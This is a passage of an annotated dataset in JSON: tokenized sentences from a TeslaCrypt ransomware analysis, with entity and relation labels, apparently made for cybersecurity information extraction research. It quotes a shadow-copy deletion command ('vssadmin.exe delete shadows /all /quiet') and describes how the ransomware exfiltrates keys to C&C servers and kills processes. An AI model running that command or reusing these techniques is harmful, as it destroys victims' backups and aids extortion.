"name": "POST request", "pos": [13, 15], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [125, 125], "name": "C & C", "pos": [26, 29], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "TeslaCrypt", "pos": [8, 9], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [162, 162], "name": "process", "pos": [31, 32], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [167, 167], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [182, 182], "name": "Volume Shadow", "pos": [51, 53], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "sample", "pos": [56, 57], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [191, 191], "name": "key.dat", "pos": [60, 61], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [194, 194], "name": "dropper", "pos": [1, 2], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [207, 207], "name": "payment key", "pos": [14, 16], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [212, 212], "name": "encryption key", "pos": [19, 21], "index": "24_0"}]], "labels": [{"r": "UK", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [2], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "UK", "evidence": [3], "h": 5, "t": 6}, {"r": "EX", "evidence": [3], "h": 5, "t": 7}, {"r": "RD", "evidence": [3], "h": 5, "t": 8}, {"r": "WR", "evidence": [3], "h": 5, "t": 8}, {"r": "WR", "evidence": [3], "h": 5, "t": 9}, {"r": "FR", "evidence": [3, 4, 5], "h": 5, "t": 14}, {"r": "CO", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4], "t": 8, "h": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 10, "t": 21}, {"r": "RD", "evidence": [5], "t": 12, "h": 14}, {"r": "ST", "evidence": [5], "t": 13, "h": 14}, {"r": "RF", "evidence": [5], "t": 13, "h": 14}, {"r": "ST", "evidence": [5], "h": 14, "t": 15}, {"r": "RF", "evidence": [5], "h": 14, "t": 15}, {"r": "ST", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "RF", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "FR", "evidence": [6], "h": 16, "t": 18}, {"r": "UK", "evidence": [6], "t": 17, "h": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "RD", "evidence": [6], "t": 19, "h": 20}, {"r": "RD", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "RD", "evidence": [6], "t": 19, "h": 20}, {"r": "RD", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}]}, {"title": "663-7", "sents": [["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "original dropper", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "malware window", "pos": [2, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "five threads", "pos": [7, 9], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "window message", "pos": [15, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [35, 35], "name": "system Volume Shadow", "pos": [8, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [51, 51], "name": "key.dat", "pos": [24, 25], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [56, 56], "name": "encryption keys", "pos": [29, 31], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [61, 61], "name": "key.dat", "pos": [2, 3], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [82, 82], "name": "key.dat", "pos": [23, 24], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [90, 90], "name": "encryption key", "pos": [4, 6], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [94, 94], "name": "C & C", "pos": [8, 11], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [99, 99], "name": "POST request", "pos": [13, 15], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [112, 112], "name": "C & C", "pos": [26, 29], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "TeslaCrypt", "pos": [8, 9], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [149, 149], "name": "process", "pos": [31, 32], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [154, 154], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [169, 169], "name": "Volume Shadow", "pos": [51, 53], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [174, 174], "name": "sample", "pos": [56, 57], "index": "19_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [178, 178], "name": "key.dat", "pos": [60, 61], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [181, 181], "name": "dropper", "pos": [1, 2], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [194, 194], "name": "payment key", "pos": [14, 16], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [199, 199], "name": "encryption key", "pos": [19, 21], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "other dropper", "pos": [1, 3], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [216, 216], "name": "Recovery key", "pos": [14, 16], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "UK", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 4, "t": 7}, {"r": "WR", "evidence": [2], "h": 4, "t": 7}, {"r": "WR", "evidence": [2], "h": 4, "t": 8}, {"r": "FR", "evidence": [2, 3, 4], "h": 4, "t": 13}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 20}, {"r": "RD", "evidence": [4], "t": 11, "h": 13}, {"r": "ST", "evidence": [4], "t": 12, "h": 13}, {"r": "RF", "evidence": [4], "t": 12, "h": 13}, {"r": "ST", "evidence": [4], "h": 13, "t": 14}, {"r": "RF", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [4, 5], "t": 14, "h": 15}, {"r": "RF", "evidence": [4, 5], "t": 14, "h": 15}, {"r": "FR", "evidence": [5], "h": 15, "t": 17}, {"r": "UK", "evidence": [5], "t": 16, "h": 17}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [5], "t": 18, "h": 19}, {"r": "RD", "evidence": [5], "t": 18, "h": 19}, {"r": "WR", "evidence": [5], "t": 18, "h": 19}, {"r": "RD", "evidence": [5], "t": 18, "h": 19}, {"r": "RD", "evidence": [5], "t": 18, "h": 19}, {"r": "WR", "evidence": [5], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "WR", "evidence": [6], "h": 21, "t": 23}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}]}, {"title": "663-8", "sents": [["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "malware window", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "five threads", "pos": [7, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "window message", "pos": [15, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [28, 28], "name": "system Volume Shadow", "pos": [8, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [44, 44], "name": "key.dat", "pos": [24, 25], "index": "6_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "encryption keys", "pos": [29, 31], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "key.dat", "pos": [2, 3], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [75, 75], "name": "key.dat", "pos": [23, 24], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "encryption key", "pos": [4, 6], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [87, 87], "name": "C & C", "pos": [8, 11], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [92, 92], "name": "POST request", "pos": [13, 15], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [105, 105], "name": "C & C", "pos": [26, 29], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "TeslaCrypt", "pos": [8, 9], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [142, 142], "name": "process", "pos": [31, 32], "index": "15_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [147, 147], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [162, 162], "name": "Volume Shadow", "pos": [51, 53], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [167, 167], "name": "sample", "pos": [56, 57], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [171, 171], "name": "key.dat", "pos": [60, 61], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [174, 174], "name": "dropper", "pos": [1, 2], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [187, 187], "name": "payment key", "pos": [14, 16], "index": "21_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [192, 192], "name": "encryption key", "pos": [19, 21], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [196, 196], "name": "other dropper", "pos": [1, 3], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [209, 209], "name": "Recovery key", "pos": [14, 16], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "GetAndHashOsData", "pos": [1, 2], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "UK", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [1], "h": 3, "t": 7}, {"r": "FR", "evidence": [1, 2, 3], "h": 3, "t": 12}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 19}, {"r": "RD", "evidence": [3], "t": 10, "h": 12}, {"r": "ST", "evidence": [3], "t": 11, "h": 12}, {"r": "RF", "evidence": [3], "t": 11, "h": 12}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "ST", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4], "h": 14, "t": 16}, {"r": "UK", "evidence": [4], "t": 15, "h": 16}, {"r": "RD", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "t": 17, "h": 18}, {"r": "RD", "evidence": [4], "t": 17, "h": 18}, {"r": "WR", "evidence": [4], "t": 17, "h": 18}, {"r": "RD", "evidence": [4], "t": 17, "h": 18}, {"r": "RD", "evidence": [4], "t": 17, "h": 18}, {"r": "WR", "evidence": [4], "t": 17, "h": 18}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "WR", "evidence": [6], "h": 23, "t": 24}]}, {"title": "663-9", "sents": [["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [8, 8], "name": "system Volume Shadow", "pos": [8, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [24, 24], "name": "key.dat", "pos": [24, 25], "index": "3_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [29, 29], "name": "encryption keys", "pos": [29, 31], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [34, 34], "name": "key.dat", "pos": [2, 3], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [55, 55], "name": "key.dat", "pos": [23, 24], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [63, 63], "name": "encryption key", "pos": [4, 6], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [67, 67], "name": "C & C", "pos": [8, 11], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [72, 72], "name": "POST request", "pos": [13, 15], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [85, 85], "name": "C & C", "pos": [26, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [99, 99], "name": "TeslaCrypt", "pos": [8, 9], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [122, 122], "name": "process", "pos": [31, 32], "index": "12_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [127, 127], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "13_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [142, 142], "name": "Volume Shadow", "pos": [51, 53], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [147, 147], "name": "sample", "pos": [56, 57], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [151, 151], "name": "key.dat", "pos": [60, 61], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [154, 154], "name": "dropper", "pos": [1, 2], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [167, 167], "name": "payment key", "pos": [14, 16], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [172, 172], "name": "encryption key", "pos": [19, 21], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "other dropper", "pos": [1, 3], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [189, 189], "name": "Recovery key", "pos": [14, 16], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [194, 194], "name": "GetAndHashOsData", "pos": [1, 2], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [214, 214], "name": "it", "pos": [2, 3], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [225, 225], "name": "LAN network statistics", "pos": [13, 16], "index": "24_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [238, 238], "name": "Windows Crypto", "pos": [26, 28], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [248, 248], "name": "process descriptors", "pos": [36, 38], "index": "26_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [257, 257], "name": "loaded modules", "pos": [45, 47], "index": "27_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [265, 265], "name": "physical memory", "pos": [53, 55], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [273, 273], "name": "it", "pos": [61, 62], "index": "29_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [279, 279], "name": "SHA1 values", "pos": [67, 69], "index": "30_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 9}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 16}, {"r": "RD", "evidence": [2], "t": 7, "h": 9}, {"r": "ST", "evidence": [2], "t": 8, "h": 9}, {"r": "RF", "evidence": [2], "t": 8, "h": 9}, {"r": "ST", "evidence": [2], "h": 9, "t": 10}, {"r": "RF", "evidence": [2], "h": 9, "t": 10}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 13}, {"r": "UK", "evidence": [3], "t": 12, "h": 13}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "WR", "evidence": [3], "t": 14, "h": 15}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "RD", "evidence": [3], "t": 14, "h": 15}, {"r": "WR", "evidence": [3], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 17, "t": 19}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "FR", "evidence": [5, 6, 7], "h": 20, "t": 23}, {"r": "EX", "evidence": [6, 7], "t": 22, "h": 23}, {"r": "RD", "evidence": [7], "h": 23, "t": 24}, {"r": "RD", "evidence": [7], "h": 23, "t": 25}, {"r": "RD", "evidence": [7], "h": 23, "t": 26}, {"r": "RD", "evidence": [7], "h": 23, "t": 27}, {"r": "RD", "evidence": [7], "h": 23, "t": 28}, {"r": "WR", "evidence": [7], "h": 29, "t": 30}, {"r": "CO", "evidence": [7], "h": 23, "t": 29}]}, {"title": "663-10", "sents": [["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."], ["The", "other", "dropper", "implements", "the", "concept", "of", "an", "additional", "key", "known", "as", "the", "``", "Recovery", "key", "'", "."], ["``", "GetAndHashOsData", "''", "is", "the", "function", "responsible", "for", "creating", "the", "base", "buffer", "for", "the", "generation", "of", "all", "keys", "."], ["At", "startup", "it", "acquires", "the", "following", "info", ":", "the", "global", "workstation", "'", "s", "LAN", "network", "statistics", ",", "using", "the", "NetStatisticsGet", "API", "function64", "random", "bytes", "generated", "by", "Windows", "Crypto", "functionsall", "heap", "descriptors", "of", "its", "own", "processall", "active", "process", "descriptors", "and", "the", "threads", "descriptors", "of", "each", "processall", "loaded", "modules", "in", "each", "processthe", "workstation", "'", "s", "physical", "memory", "informationOnce", "the", "data", "is", "acquired", ",", "it", "generates", "a", "big", "array", "of", "SHA1", "values", ",", "one", "for", "every", "20", "bytes", "of", "acquired", "data", "."], ["At", "the", "end", "it", "calculates", "and", "stores", "a", "global", "SHA1", "value", "for", "the", "entire", "array", ",", "in", "a", "symbol", "that", "we", "have", "called", "``", "g_lpGlobalOsDataSha1", "''", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "key.dat", "pos": [2, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [23, 23], "name": "key.dat", "pos": [23, 24], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [31, 31], "name": "encryption key", "pos": [4, 6], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [35, 35], "name": "C & C", "pos": [8, 11], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "POST request", "pos": [13, 15], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [53, 53], "name": "C & C", "pos": [26, 29], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "TeslaCrypt", "pos": [8, 9], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [90, 90], "name": "process", "pos": [31, 32], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [95, 95], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "8_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [110, 110], "name": "Volume Shadow", "pos": [51, 53], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [115, 115], "name": "sample", "pos": [56, 57], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [119, 119], "name": "key.dat", "pos": [60, 61], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "dropper", "pos": [1, 2], "index": "12_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [135, 135], "name": "payment key", "pos": [14, 16], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [140, 140], "name": "encryption key", "pos": [19, 21], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [144, 144], "name": "other dropper", "pos": [1, 3], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [157, 157], "name": "Recovery key", "pos": [14, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "GetAndHashOsData", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [182, 182], "name": "it", "pos": [2, 3], "index": "18_0"}], 